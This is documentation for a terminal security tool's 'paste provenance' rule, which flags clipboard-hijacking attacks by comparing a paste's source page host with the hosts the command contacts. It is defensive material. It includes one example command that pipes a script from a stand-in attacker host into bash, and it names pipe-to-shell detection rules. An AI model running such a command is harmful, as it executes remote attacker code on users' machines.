# Paste provenance (M12 ch1)

When you paste a command into your terminal, tirith already scans the *content*
(pipe-to-shell, suspicious URLs, hidden Unicode, secrets). **Paste provenance**
adds a second axis: *where did this paste come from, and does that match where it
runs?*

A common attack is **clipboard hijacking / copy-paste poisoning** — a web page
shows a benign-looking install command but, via JavaScript or hidden text, the
clipboard actually carries a command that downloads from an attacker's host. If
tirith knows the paste was copied from `docs.trusted.example` but the command
runs `curl https://evil.example/install.sh | bash`, that cross-host mismatch is
a strong signal.

This is surfaced by the `paste_source_mismatch` rule
(`RuleId::PasteSourceMismatch`).

## The companion browser extension

tirith does not (and cannot) observe your browser by itself. A **companion
browser extension** (shipped from a separate repository) writes a small JSON
record every time it sets the system clipboard, at:

```text
<state-dir>/clipboard_source.json
```

where `<state-dir>` is `tirith`'s state directory
(`$XDG_STATE_HOME/tirith` or `~/.local/state/tirith`). tirith only ever **reads**
this file — it never writes it.

### Record schema

```json
{
  "updated_at": "2026-05-30T12:00:00Z",
  "content_sha256": "<lowercase hex sha256 of the copied content>",
  "source_url": "https://docs.trusted.example/install",
  "source_title": "Install Guide",
  "hidden_text_detected": false
}
```

| field                  | meaning                                                                 |
| ---------------------- | ----------------------------------------------------------------------- |
| `updated_at`           | RFC-3339 timestamp the extension set the clipboard.                     |
| `content_sha256`       | SHA-256 (hex) of the content the extension copied — the attribution key. |
| `source_url`           | The page URL the content was copied from.                              |
| `source_title`         | The page title (best-effort, may be empty).                            |
| `hidden_text_detected` | Whether the extension saw hidden / invisible text in the selection.    |

`source_title` and `hidden_text_detected` are optional; a minimal record without
them still parses. Unknown fields are ignored, so a newer extension can add
fields without breaking an older `tirith`. A missing, unreadable, oversized, or
malformed file is treated as "no source recorded" — the rule simply does not
fire (fail-safe; the read is capped and race-free, so a `clipboard_source.json`
swapped for a FIFO/device can never hang the paste path).

## How the rule decides

The rule runs in **paste context only** (`tirith paste`, the shell paste
interceptor, `tirith clipboard scan`). Its logic, in order:

1. **Read** `clipboard_source.json`. Absent / unreadable → no finding.
2. **Attribute.** Compute `sha256(pasted_content)`. If it does **not** equal the
   record's `content_sha256`, the paste did not come from the recorded source
   (the clipboard was replaced after the extension wrote it) — make **no**
   attribution and emit **no** finding.
3. **Compare hosts.** When the hash matches, extract the destination host(s)
   from every URL in the pasted command and compare them to the `source_url`
   host. If the source host equals every destination host → no finding.
4. **Bare host mismatch → Info.** A documentation page on `docs.example.com`
   legitimately links install URLs that live on `github.com`, `npmjs.com`, or
   `docker.io`, so a host mismatch *on its own* is common and benign. It is
   surfaced as an advisory `Info` note that never changes the action. (At the
   default paranoia level, `Info` findings are filtered from output entirely.)
5. **Host mismatch + a risk signal → High.** Any one of the following turns the
   benign cross-host paste into a likely attack:

   | risk signal                              | source                                                                 |
   | ---------------------------------------- | ---------------------------------------------------------------------- |
   | hidden text in the copied selection      | `hidden_text_detected: true`, **or** a `clipboard_hidden` finding fired |
   | destination is a URL shortener           | the real target is concealed behind a redirect                          |
   | paste pipes to a shell interpreter       | a `pipe_to_interpreter` / `curl_pipe_shell` / `wget_pipe_shell` / … finding fired |
   | destination not in trusted install hosts | the host is absent from `policy.allowed_install_domains` (only when that list is non-empty) |
   | OSC 8 visible URL ≠ its click target     | a terminal hyperlink renders one host but points at another             |

The finding records only the source host, the mismatched destination host(s),
and which signals fired — never the pasted content, the source title, or the
full URLs.

## Configuring trusted install sources

If you routinely paste install commands that legitimately download from hosts
other than the docs page (the common case), add those hosts to your policy so a
bare cross-host paste stays `Info` instead of escalating:

```yaml
# .tirith/policy.yaml
allowed_install_domains:
  - github.com            # also matches objects.github.com (dot-suffix subdomain)
  - registry.npmjs.org
  - registry-1.docker.io
```

Matching is case-insensitive and covers an exact host or a dot-suffix subdomain
(`github.com` also allows `objects.github.com`), but **not** a lookalike like
`evilgithub.com`. With the list empty (the default), the "not in trusted hosts"
signal never fires — the rule still escalates on the other four signals.

## CLI surfaces

| command                          | behavior                                                                       |
| -------------------------------- | ------------------------------------------------------------------------------ |
| `tirith paste --with-source --json` | adds a top-level `clipboard_source` key (`{source_url, source_title}`) to the JSON envelope when the companion record matches this paste; `null` when there is no matching source. The source is metadata, **not** a Finding. |
| `tirith clipboard watch`         | polls the clipboard and prints the attributed source URL each time the companion extension records a new source whose hash matches the current clipboard. A no-op without the extension. |

Both surfaces degrade gracefully: without the companion extension installed
there is no `clipboard_source.json`, so `--with-source` reports no source and
`watch` simply waits.

## Privacy / no phone-home

Consistent with tirith's no-telemetry stance, paste provenance is entirely
local: tirith reads a local file written by a local extension and never
transmits anything. The rule never echoes the pasted content off the machine,
and the companion record is read-only from tirith's perspective.
